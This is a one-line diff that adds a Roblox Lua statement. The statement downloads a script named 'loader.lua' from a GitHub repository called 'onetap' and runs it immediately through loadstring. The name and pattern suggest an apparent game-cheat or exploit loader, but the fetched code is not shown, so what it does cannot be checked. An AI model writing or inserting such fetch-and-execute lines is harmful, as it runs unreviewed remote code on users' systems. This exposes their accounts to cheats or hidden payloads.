@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vl5613580-arch/onetap/main/loader.lua"))()
